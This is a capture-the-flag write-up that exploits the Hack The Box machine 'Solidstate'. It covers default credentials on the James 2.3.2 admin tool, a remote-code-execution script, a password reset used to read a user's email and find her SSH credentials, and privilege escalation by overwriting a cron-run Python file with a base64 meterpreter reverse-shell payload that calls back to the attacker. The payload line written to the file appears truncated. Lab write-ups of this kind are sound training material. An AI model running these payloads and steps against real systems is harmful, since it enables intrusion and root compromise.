# Solidstate
#### 10.10.10.51

```{r, engine='bash', sh}
nmap -T4 -A -v 10.10.10.51

22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.40 [10.10.14.40]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
```
James 2.3.2 - seems vulnerable.
=> https://www.exploit-db.com/exploits/35513/

We see that the payload in the script is actually delivered by
abusing the "James Remote Administration Tool" on port 4555 with
the standard credentials root:root.

Lets try and connect to the James Remote Administration Tool manually first.

```{r, engine='bash', sh}
root@kali:/media/sf_CTF/hackthebox.eu/Machines/SolidState# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Awesome, so standard credentials works for this box and we are able to deliver our payload.

So we build the payload:

```{r, engine='bash', sh}
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.40 LPORT=9999
```

Append it to our python script.
And set up the handler with msf.

```{r, engine='bash', sh}
msf exploit(handler) > set PAYLOAD cmd/unix/reverse_bash
PAYLOAD => cmd/unix/reverse_bash
msf exploit(handler) > setg LHOST 10.10.14.40
LHOST => 10.10.14.40
msf exploit(handler) > set LPORT 9999
LPORT => 9999
msf exploit(handler) > exploit
[*] Exploit running as background job.
```

As the final step we deliver our payload to the target with:

```{r, engine='bash', sh}
root@kali:/media/sf_CTF/hackthebox.eu/Machines/SolidState# python james_2.3.2_rce.py 10.10.10.51
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

As the exploit says, the payload itself will only fire if someone logs in on the box.
So either we wait for someone logging in or we get ourself some credentials.

So let´s reevaluate what power we have with the James Remote Administration Tool.

```{r, engine='bash', sh}
root@kali:/media/sf_CTF/hackthebox.eu/Machines/SolidState# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Note that we have the ability to reset passwords for users.
So first we list the users, change the password and login via the opened POP3.

```{r, engine='bash', sh}
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword mindy mindylol
Password for mindy reset
```

Awesome, that worked. Now lets check the mails.

```{r, engine='bash', sh}
root@kali:/media/sf_CTF/hackthebox.eu/Machines/SolidState# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS mindylol
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

So that should be enough to pop our payload.
Why not loggin in via SSH and just use that ?
After logging in via SSH you are greeted with a really limited shell.
By actually exploiting the James RCE we circumvent this.

After logging in via SSH we are greeted on our msf console window with.

```{r, engine='bash', sh}
msf exploit(handler) > [*] Command shell session 1 opened (10.10.14.40:9999 -> 10.10.10.51:51008) at 2017-10-25 06:32:16 +0200
```

#### AFTER THAT TO EDIT LOL NEED TO EXPLAIN BETTER AND MORE ####
The next steps for me are upgrading the shell to meterpreter, snatching the user.txt and running local enumeration.

```{r, engine='bash', sh}
cat /home/mindy/user.txt
914d0a4ebc177889b5b89a23f556fd75

run local enum shit
```

Interesting output:

```{r, engine='bash', sh}
##
##  World Writable FIles
##


/opt/tmp.py
```


So lets check what this file is about.

```{r, engine='bash', sh}
cat /opt/tmp.py

#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Ok so that file seems to run python and deletes all files and folders in /tmp.
So the next steps im taking are, creating a file in /tmp and wait that it gets deleted.
After confirming that it actually deletes it we can be sure that it´s some kind of cronjob 
executing it.

by running crontab -l we can confirm that it is indeed not "mindy" executing this script.

So lets try to escalate our privilege by creating a new msf payload.
Then we start the msf reverse handler, overwrite the python file and wait for the cronjob to execute our payload.

```{r, engine='bash', sh}
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=8888
No platform was selected, choosing Msf::Module::Platform::Python from the payload
No Arch selected, selecting Arch: python from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 450 bytes
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjE0LjQwJyw4ODg4KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))
```

Then we get the handler running and inject our payload in the file.

```{r, engine='bash', sh}
echo "aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEwLjEwLjE0LjQwJyw4ODg4KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc" > /opt/tmp.py
```

Now we wait a minute, payload executes, shell spawns.

```{r, engine='bash', sh}
whoami
root
/cat/root.txt
b4c9723a28899b1c45db281d99cc87c9
```
